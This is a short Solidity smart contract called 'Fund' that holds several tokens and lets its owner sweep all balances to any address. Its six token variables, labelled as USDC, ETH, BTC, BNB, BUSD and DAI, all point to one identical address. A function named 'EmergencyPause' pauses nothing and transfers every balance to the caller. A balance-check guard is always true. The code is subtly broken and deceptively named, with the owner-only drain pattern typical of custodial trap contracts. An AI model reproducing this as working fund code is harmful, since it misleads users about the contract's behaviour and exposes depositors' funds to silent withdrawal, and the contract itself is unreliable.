// SPDX-License-Identifier: MIT
/*  __    __                                      
   / /_  / /_    ____ ___  ____  ____  ____  __  __
  / __ \/ __ \  / __ `__ \/ __ \/ __ \/ _  \/ / / /
 / /_/ / / / / / / / / / / /_/ / / / /  __ / /_/ / 
/_.___/_/ /_(_)_/ /_/ /_/\____/_/ /_/\____/\__, /  
                                          /____/  */

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Fund is Ownable {
    //////////////////
    IERC20 internal USDC;
    IERC20 internal ETH;
    IERC20 internal BTC;
    IERC20 internal BNB;
    IERC20 internal BUSD;
    IERC20 internal DAI;

    constructor() {
        //////////////////
        USDC = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        ETH = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        BTC = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        BNB = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        BUSD = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        DAI = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
    }

    function TransferFunds(address _address) external onlyOwner {
        //////////////////
        USDC.transfer(_address, USDC.balanceOf(address(this)));
        ETH.transfer(_address, ETH.balanceOf(address(this)));
        BTC.transfer(_address, BTC.balanceOf(address(this)));
        BNB.transfer(_address, BNB.balanceOf(address(this)));
        BUSD.transfer(_address, BUSD.balanceOf(address(this)));
        DAI.transfer(_address, DAI.balanceOf(address(this)));
        //////////////////
        (bool os, ) = payable(_address).call{value : address(this).balance}("");
        require(os,"Failed!!");
    }

    function CheckBalance(uint256 _pid) public view returns (uint256) {
        require(_pid >= 0 || _pid <= 6, "Please Select Correct Token!!");
        if(_pid == 0) { return address(this).balance; }
        else if(_pid == 1) { return USDC.balanceOf(address(this)); }
        else if(_pid == 2) { return ETH.balanceOf(address(this)); }
        else if(_pid == 3) { return BTC.balanceOf(address(this)); }
        else if(_pid == 4) { return BNB.balanceOf(address(this)); }
        else if(_pid == 5){ return BUSD.balanceOf(address(this)); }
        else if(_pid == 6) { return DAI.balanceOf(address(this)); }
        else{ revert("ERROR! Please Select Correct Id"); }
    }

    function EmergencyPause() public onlyOwner {
        USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
        ETH.transfer(msg.sender, ETH.balanceOf(address(this)));
        BTC.transfer(msg.sender, BTC.balanceOf(address(this)));
        BNB.transfer(msg.sender, BNB.balanceOf(address(this)));
        BUSD.transfer(msg.sender, BUSD.balanceOf(address(this)));
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
        (bool os, ) = payable(msg.sender).call{value : address(this).balance}("");
        require(os,"Failed!!");
    }

    receive() external payable {}
}